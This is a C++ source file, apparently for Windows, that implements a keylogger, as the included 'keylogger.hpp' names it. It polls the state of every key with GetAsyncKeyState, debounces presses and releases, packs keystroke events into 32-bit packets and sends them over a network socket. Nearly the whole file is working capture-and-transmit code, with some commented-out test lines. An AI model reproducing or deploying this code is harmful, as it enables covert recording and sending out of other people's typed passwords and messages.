#include <iostream>
#include <string>
#include <fstream>
#include <unordered_set>
#include <chrono>
#include <bitset>
#ifdef _WIN32
#include <winsock2.h>
#include <Windows.h>
#include <winuser.h>
#include <ws2tcpip.h>
#endif
#include "keylogger.hpp"
#define ARRAY_SIZE 32
#define DEBOUNCE_DURATION 50
void updateKeyState(uint8_t vkCode, bool pressed, std::array<uint8_t, ARRAY_SIZE>& keyStates) {
    if (vkCode < 256) {    
        // std::cout<<"Key code in range"<<static_cast<int>(vkCode)<<std::endl;
        size_t byteIndex = vkCode / 8;        
        size_t bitIndex = vkCode % 8; 
        if (pressed) {
            keyStates[byteIndex] |= (1 << bitIndex);        
        } else {
            keyStates[byteIndex] &= ~(1 << bitIndex);
        }
    } else {
        std::cout << "Virtual key code out of range" << std::endl;
        
    }
}

bool isBitSet(const std::array<uint8_t, ARRAY_SIZE>& keyStates, uint8_t vkCode) {
    if (vkCode >= 256) {
        return false; // Out of range
    }

    size_t byteIndex = vkCode / 8;
    size_t bitIndex = vkCode % 8;

    return (keyStates[byteIndex] & (1 << bitIndex)) != 0;
}


std::vector<uint32_t> findChanges(const std::vector<BYTE>& currentKeys,
                                     const std::vector<BYTE>& pastKeys,
                                      std::array<uint8_t, ARRAY_SIZE>& bitmask,
                                     std::unordered_map<BYTE, std::chrono::steady_clock::time_point>& keyPressTimes) {
    std::unordered_set<BYTE> currentKeySet(currentKeys.begin(), currentKeys.end());
    std::unordered_set<BYTE> pastKeySet(pastKeys.begin(), pastKeys.end());
    std::vector<uint32_t> result;
    std::chrono::steady_clock::time_point now = std::chrono::steady_clock::now();
    std::vector<uint8_t> smallResult;
    for (BYTE key : pastKeySet) {
        if (currentKeySet.find(key) == currentKeySet.end() && isBitSet(bitmask, key)) {
            // // Key was in past but not pressed now, meaning it was released
            // result.push_back("Key " + std::to_string(key) + " was released");
            // updateKeyState(key, false, bitmask);
            std::unordered_map<BYTE, std::chrono::steady_clock::time_point>::iterator lastPressTime = keyPressTimes.find(key);
            if (lastPressTime != keyPressTimes.end() &&
                std::chrono::duration_cast<std::chrono::milliseconds>(now - lastPressTime->second).count() >= DEBOUNCE_DURATION) {
                // Key was in past but not pressed now, meaning it was released
                uint32_t key32 = static_cast<uint32_t>(key);
                result.push_back(key32);
                smallResult.push_back(key);
                updateKeyState(key, false, bitmask);
                keyPressTimes.erase(key); // Remove key from map
            }
        }
    }
    for (BYTE key : currentKeySet) {
        if (std::find(pastKeySet.begin(), pastKeySet.end(), key) == pastKeySet.end() && !isBitSet(bitmask, key)) {
            if (keyPressTimes.find(key) == keyPressTimes.end() ||
                std::chrono::duration_cast<std::chrono::milliseconds>(now - keyPressTimes[key]).count() >= DEBOUNCE_DURATION) {
                // Key is newly pressed
                uint32_t key32 = static_cast<uint32_t> (key);
                key32 = key32 | (1<<8);
                result.push_back(key32);
                smallResult.push_back(key);
                updateKeyState(key, true, bitmask);
                keyPressTimes[key] = now; // Update the time of the key press
            }
        }
    }

    // return smallResult;
    return result;
}

std::vector<uint32_t> packetize(std::vector<uint32_t> keystrokes){
    std::vector<uint32_t> packets;
    uint32_t packet = 0;
    size_t numKeystrokes = keystrokes.size();

    for (size_t i = 0; i < numKeystrokes; ++i) {
        packet |= (keystrokes[i] << ((2 - (i % 3)) * 9));

        if ((i % 3 == 2) || (i == numKeystrokes - 1)) {
            uint32_t header = (0b00 << 30) | ((i % 3 + 1) << 27);  
            packet |= header;
            packets.push_back(packet);
            packet = 0;  // Reset packet for the next group
        }
    }

    return packets;
}

void startLogging(SOCKET clientFD,std::atomic<bool>& running) {
    std::vector<BYTE> currentKeys; 
    std::vector<BYTE> pastKeys; 
    std::array<uint8_t, ARRAY_SIZE> keyStates = { 0 };
    std::vector<std::string> output;

    std::unordered_map<BYTE, std::chrono::steady_clock::time_point> keyPressTimes;
    std::chrono::milliseconds debounceDuration = std::chrono::milliseconds(DEBOUNCE_DURATION);

    while (running) {    
        currentKeys.clear();

        for (BYTE vkCode = 0; vkCode < 255; ++vkCode) {
            if (GetAsyncKeyState(vkCode) & 0x8000) { // Check if the key is pressed
                currentKeys.push_back(vkCode);
            }
        }

        // std::vector<std::string> changes = findChanges(currentKeys, pastKeys, keyStates, keyPressTimes);
        std::vector<uint32_t> changes = findChanges(currentKeys, pastKeys, keyStates, keyPressTimes);
        // output.insert(output.end(), changes.begin(), changes.end()); 
        // for (const std::string& message : output) {
        //     std::cout << message << std::endl;
        // }
        // output.clear();
        if(changes.size() !=0){
            std::vector<uint32_t> packets = packetize(changes);
            for(uint32_t byte : packets){
                std::bitset<32> binary(byte);
                std::cout<<binary<<std::endl;
            }
            std::cout<<std::endl;

            const char* buffer = reinterpret_cast<const char*>(packets.data());

            // Send the whole vector as a buffer

            size_t bytesSent = send(clientFD, buffer, packets.size() * sizeof(uint32_t), 0);
            if (bytesSent == SOCKET_ERROR) {
                std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
            } else {
                std::cout << "Bytes sent: " << bytesSent << std::endl;
            }
        }
        pastKeys = currentKeys;  

        Sleep(100); // Sleep to reduce CPU usage
    }
}
// int main(){
//     printf("starting test");
//     std::cout<<"test from std::cout"<<std::endl;
//     startLogging();
// }

